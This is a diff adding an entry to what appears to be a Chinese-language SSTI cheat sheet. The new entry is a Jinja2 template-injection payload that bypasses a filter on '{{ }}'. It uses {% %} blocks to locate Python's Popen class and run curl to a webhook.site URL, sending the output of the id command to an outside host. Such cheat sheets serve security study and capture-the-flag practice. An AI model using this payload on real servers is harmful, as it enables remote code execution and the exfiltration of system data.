@@ -3094,6 +3094,16 @@ Server-Side Template Injection
 - 過濾`{{` or `}}`
     - 用`{%%}`
     - 執行結果往外傳
+    - ```
+      	{% set _ = [].__class__.__base__.__subclasses__() %}
+		{% for c in _ %}
+  			{% if c.__name__ == 'Popen' %}
+    			{% set _ = c('curl https://webhook.site/8933764d-6f96-4f76-963d-c3e6eba329c0/`id`', shell=True, stdout=-1).communicate() %}
+  		{% endif %}
+		{% endfor %}
+	```
+     
+
 - 過濾`.`
     - `{{''.__class__}}`
         - `{{''['__class__']}}`
